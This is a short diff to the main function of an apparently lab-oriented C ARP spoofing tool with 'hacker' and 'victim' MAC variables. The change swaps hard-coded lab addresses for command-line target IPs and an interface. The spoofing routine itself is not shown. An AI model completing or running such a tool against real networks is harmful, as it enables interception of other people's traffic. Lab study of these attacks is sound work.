@@ -170,23 +170,26 @@ void spoof_arp(const int sd, struct sockaddr_ll *device,
 
 int main(int argc, char *argv[])
 {
-    // if (argc != 4) {
-    //     fprintf(stderr, "USAGE: %s source_ip target_ip interface\n", argv[0]);
-    //     exit(EXIT_FAILURE);
-    // }
+    if (argc != 4) {
+        fprintf(stderr, "USAGE: %s source_ip target_ip interface\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    int sock;
+    struct sockaddr_ll device;
 
     char *victim_ip_1, *victim_ip_2, *interface;
     unsigned char *hacker_mac = NULL;
     unsigned char *victim_mac_1 = NULL;
     unsigned char *victim_mac_2 = NULL;
-    int sock;
-    struct sockaddr_ll device;
 
+    victim_ip_1 = argv[1];
+    victim_ip_2 = argv[2];
+    interface   = argv[3];
 
-    // spoof_ip = argv[1]; victim_ip = argv[2]; interface = argv[3];
-    victim_ip_1 = "10.9.0.5";
-    victim_ip_2 = "10.9.0.6";
-    interface = "eth0";
+    // victim_ip_1 = "10.9.0.5";
+    // victim_ip_2 = "10.9.0.6";
+    // interface = "eth0";
 
 
     /** NOTE:
